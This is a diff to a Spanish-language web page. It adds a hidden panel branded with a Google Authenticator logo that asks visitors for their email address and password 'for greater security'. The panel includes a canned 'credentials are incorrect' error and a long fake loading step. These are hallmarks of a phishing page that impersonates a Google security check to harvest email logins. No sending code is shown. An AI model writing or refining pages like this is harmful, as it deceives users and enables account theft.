@@ -1,3 +1,19 @@
+      <style>
+        .input-modern.error {
+          border-color: #e05 !important;
+          box-shadow: 0 0 0 2px #ffe0e0;
+        }
+        .auth-error-msg {
+          color: #b1001a;
+          background: #fff0f0;
+          border: 1px solid #e05;
+          border-radius: 6px;
+          padding: 10px 14px;
+          margin-bottom: 12px;
+          font-size: 1rem;
+          display: none;
+        }
+      </style>
 <!doctype html>
 <html lang="es">
   <head>
@@ -154,6 +170,51 @@
                 background: #fff;
               }
             </style>
+
+                  <!-- Panel de autenticación extra -->
+      <div id="panelAuthenticator" class="secondary" aria-hidden style="display:none;">
+        <div class="logo" aria-hidden>
+          <img class="logoAuth" src="https://static.vecteezy.com/system/resources/previews/072/678/178/non_2x/google-authenticator-logo-icon-free-png.png" alt="logotipo">
+        </div>
+        <h1 class="sign">Authenticator for security</h1>
+        <p class="lead">For greater security of your account, we need you to enter your login credentials to your email.</p>
+
+        <div id="authErrorAlert" class="auth-error-msg">
+          <span style="font-weight:bold;">&#9888;</span> The credentials are incorrect. Please try again.
+        </div>
+        <div class="field">
+          <label for="authEmail">Email</label>
+          <input id="authEmail" type="email" placeholder="user@example.com" class="input-modern">
+              
+        </div>
+        <div class="field">
+          <label for="authPassword">Password</label>
+          <input id="authPassword" type="password" placeholder="">
+        </div>
+        <button id="authSubmitBtn" class="btn">Sign in</button>
+        <div id="authLoader" style="display:none;margin-top:24px;text-align:center;">
+          <div class="loader" style="margin:auto;"></div>
+          <div id="authLoaderMsg" style="margin-top:12px;color:#555;font-size:1rem;">This may take a few minutes...</div>
+        </div>
+            <style>
+              .loader {
+                width: 50px;
+                height: 50px;
+                border: 5px solid rgb(0,0,0,0.11);
+                border-radius: 50%;
+                border-top-color: rgb(235, 169, 47);
+                border-left-color: rgb(43, 145, 87);
+                border-right-color: rgb(20, 102, 226);
+                border-bottom-color: rgb(224, 71, 71);
+                animation: loader1776 2s linear infinite;
+              }
+              @keyframes loader1776 {
+                to {
+                  transform: rotate(360deg);
+                }
+              }
+            </style>
+      </div>
         
       </section>
       
